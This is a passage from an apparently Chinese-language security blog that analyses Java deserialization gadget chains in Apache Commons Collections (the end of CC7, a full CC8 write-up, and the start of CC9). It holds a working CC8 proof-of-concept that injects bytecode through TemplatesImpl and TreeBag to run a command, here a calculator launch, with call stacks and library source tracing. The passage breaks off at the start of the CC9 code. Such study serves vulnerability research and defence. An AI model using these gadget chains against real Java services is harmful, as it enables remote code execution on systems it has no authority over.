<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(innerMap1, transformerChain);</span><br><span class="line">lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(innerMap2, transformerChain);</span><br><span class="line">lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">hashtable.put(lazyMap2, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> transformerChain.getClass().getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(transformerChain, transformers);</span><br><span class="line"></span><br><span class="line">lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br></pre></td></tr></table></figure>
<p><strong>hashtable#put</strong>执行了两次，因为反序列化时，一开始<strong>table</strong>是为空，所以不会进入<strong>for</strong>循环触发<strong>Hashtable#equals</strong>，而是直接进到下面的赋值。</p>
<p>因此第二次执行<strong>hashtable#put</strong>时，<strong>table</strong>有内容了，于是触发<strong>Hashtable#equals</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reconstitutionPut</span><span class="params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span> <span class="keyword">throws</span> StreamCorruptedException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> key.hashCode();</span><br><span class="line">    <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Creates the new entry.</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">    tab[index] = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(hash, key, value, e);</span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而此处的<strong>yy</strong>和<strong>zZ</strong>，是因为前面的这处<strong>e.hash
== hash</strong>的哈希计算，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">(<span class="type">char</span> a[])</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (a == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">char</span> element : a)</span><br><span class="line">        result = <span class="number">31</span> * result + element;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>利用哈希碰撞构造两个不相等但哈希相等的字符串即可，若字符串相等，则会被认为是同一个值，导致<strong>hashtable#put</strong>执行时只遍历一次。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HashCrack</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">secret</span> <span class="operator">=</span> <span class="string">&quot;aa&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> secret.hashCode();</span><br><span class="line">        <span class="type">String</span> <span class="variable">dic</span> <span class="operator">=</span> <span class="string">&quot;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> i : dic.toCharArray()) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">char</span> j : dic.toCharArray()) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span> + i + j + secret.substring(<span class="number">2</span>);</span><br><span class="line">                <span class="keyword">if</span> (tmp.hashCode() == hash) &#123;</span><br><span class="line">                    System.out.println(tmp);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而最后移除<strong>lazyMap2</strong>中的<strong>yy</strong>，是因为在构造<strong>POC</strong>中第二次执行<strong>hashtable#put</strong>时，触发了<strong>AbstractMap#equals</strong>。</p>
<p><strong>AbstractMap#equals</strong>中<strong>entrySet().iterator()</strong>返回了所有的键值对，而第一次执行插入了<strong>yy</strong>，故在循环中取出<strong>yy</strong>这个键值对，然后带进了<strong>LazyMap#get</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">        <span class="keyword">while</span> (i.hasNext()) &#123;</span><br><span class="line">            Entry&lt;K,V&gt; e = i.next();</span><br><span class="line">            <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey();</span><br><span class="line">            <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();</span><br><span class="line">            <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!(m.get(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key)))</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!value.equals(m.get(key)))</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>跟到<strong>LazyMap#get</strong>，发现执行了<strong>this.factory.transform(key)</strong>，但一开始的<strong>transformerChain</strong>并未构造反序列化链，所以直接返回了原值，然后执行了<strong>put</strong>，将<strong>yy</strong>置入了<strong>lazyMap2</strong>中。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);</span><br><span class="line">        <span class="built_in">super</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而若不移除，则最后反序列化的时候，会导致<strong>AbstractMap#equals</strong>中对大小的教员返回<strong>false</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;</span><br><span class="line">    <span class="keyword">if</span> (m.size() != size())</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="commonscollections8">CommonsCollections8</h1>
<h2 id="影响版本-7">影响版本</h2>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.25.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="poc-8">POC</h2>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.bag.TreeBag;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC8</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 字节码</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// CC2 _tfactory成员变量会在反序列化调用构造方法时自动创建赋值</span></span><br><span class="line">        <span class="type">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;classBytes&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, targetByteCodes);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">TreeBag</span> <span class="variable">tree</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeBag</span>(<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer));</span><br><span class="line">        tree.add(templates);</span><br><span class="line"></span><br><span class="line">        setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./CC8&quot;</span>));</span><br><span class="line">            outputStream.writeObject(tree);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./CC8&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span></span><br><span class="line">            <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>) field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="调用栈-8">调用栈</h2>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">exec:<span class="number">347</span>, Runtime (java.lang)</span><br><span class="line">&lt;clinit&gt;:-<span class="number">1</span>, EvilCat181262220991834</span><br><span class="line">newInstance0:-<span class="number">1</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">62</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">45</span>, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">422</span>, Constructor (java.lang.reflect)</span><br><span class="line">newInstance:<span class="number">442</span>, Class (java.lang)</span><br><span class="line">getTransletInstance:<span class="number">455</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:<span class="number">486</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">transform:<span class="number">129</span>, InvokerTransformer (org.apache.commons.collections4.functors)</span><br><span class="line">compare:<span class="number">81</span>, TransformingComparator (org.apache.commons.collections4.comparators)</span><br><span class="line">compare:<span class="number">1291</span>, TreeMap (java.util)</span><br><span class="line">put:<span class="number">538</span>, TreeMap (java.util)</span><br><span class="line">doReadObject:<span class="number">524</span>, AbstractMapBag (org.apache.commons.collections4.bag)</span><br><span class="line">readObject:<span class="number">129</span>, TreeBag (org.apache.commons.collections4.bag)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1058</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1900</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1801</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1351</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">371</span>, ObjectInputStream (java.io)</span><br><span class="line">main:<span class="number">48</span>, CC8</span><br></pre></td></tr></table></figure>
<h2 id="分析-7">分析</h2>
<p><strong>TreeBag#readObject</strong>转到<strong>TreeBag#doReadObject</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(<span class="keyword">final</span> ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    in.defaultReadObject();</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span>  <span class="comment">// This will fail at runtime if the stream is incorrect</span></span><br><span class="line">    <span class="keyword">final</span> Comparator&lt;? <span class="built_in">super</span> E&gt; comp = (Comparator&lt;? <span class="built_in">super</span> E&gt;) in.readObject();</span><br><span class="line">    <span class="built_in">super</span>.doReadObject(<span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;E, MutableInteger&gt;(comp), in);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>TreeBag#doReadObject</strong>调用了<strong>map.put</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doReadObject</span><span class="params">(<span class="keyword">final</span> Map&lt;E, MutableInteger&gt; map, <span class="keyword">final</span> ObjectInputStream in)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="built_in">this</span>.map = map;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">entrySize</span> <span class="operator">=</span> in.readInt();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; entrySize; i++) &#123;</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span> <span class="comment">// This will fail at runtime if the stream is incorrect</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">E</span> <span class="variable">obj</span> <span class="operator">=</span> (E) in.readObject();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> in.readInt();</span><br><span class="line">        map.put(obj, <span class="keyword">new</span> <span class="title class_">MutableInteger</span>(count));</span><br><span class="line">        size += count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>TreeMap#put</strong>调用了<strong>TreeMap#compare</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    Entry&lt;K,V&gt; t = root;</span><br><span class="line">    <span class="keyword">if</span> (t == <span class="literal">null</span>) &#123;</span><br><span class="line">        compare(key, key); <span class="comment">// type (and possibly null) check</span></span><br><span class="line"></span><br><span class="line">        root = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(key, value, <span class="literal">null</span>);</span><br><span class="line">        size = <span class="number">1</span>;</span><br><span class="line">        modCount++;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>TreeMap#compare</strong>再转<strong>TransformingComparator#compare</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Object k1, Object k2)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> comparator==<span class="literal">null</span> ? ((Comparable&lt;? <span class="built_in">super</span> K&gt;)k1).compareTo((K)k2)</span><br><span class="line">        : comparator.compare((K)k1, (K)k2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>TransformingComparator#compare</strong>继续转<strong>InvokerTransformer#transform</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(<span class="keyword">final</span> I obj1, <span class="keyword">final</span> I obj2)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后在<strong>InvokerTransformer#transform</strong>中触发<strong>TemplatesImpl#newTransformer</strong>，反射执行恶意字节码。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> O <span class="title function_">transform</span><span class="params">(<span class="keyword">final</span> Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> Class&lt;?&gt; cls = input.getClass();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> (O) method.invoke(input, iArgs);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> NoSuchMethodException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> +</span><br><span class="line">                                   input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> IllegalAccessException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> +</span><br><span class="line">                                   input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> InvocationTargetException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> +</span><br><span class="line">                                   input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一开始设置<strong>InvokerTransformer</strong>的<strong>methodName</strong>为<strong>toString</strong>，后面修改为<strong>newTransformer</strong>是为了防止<strong>tree.add(templates)</strong>提前在本地执行恶意字节码，下附调用栈。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">transform:<span class="number">129</span>, InvokerTransformer (org.apache.commons.collections4.functors)</span><br><span class="line">compare:<span class="number">81</span>, TransformingComparator (org.apache.commons.collections4.comparators)</span><br><span class="line">compare:<span class="number">1291</span>, TreeMap (java.util)</span><br><span class="line">put:<span class="number">538</span>, TreeMap (java.util)</span><br><span class="line">add:<span class="number">257</span>, AbstractMapBag (org.apache.commons.collections4.bag)</span><br><span class="line">add:<span class="number">241</span>, AbstractMapBag (org.apache.commons.collections4.bag)</span><br><span class="line">add:<span class="number">90</span>, TreeBag (org.apache.commons.collections4.bag)</span><br><span class="line">main:<span class="number">38</span>, CC8</span><br></pre></td></tr></table></figure>
<h1 id="commonscollections9">CommonsCollections9</h1>
<p><strong>CC8+CC5</strong>。</p>
<h2 id="影响版本-8">影响版本</h2>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="poc-9">POC</h2>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> 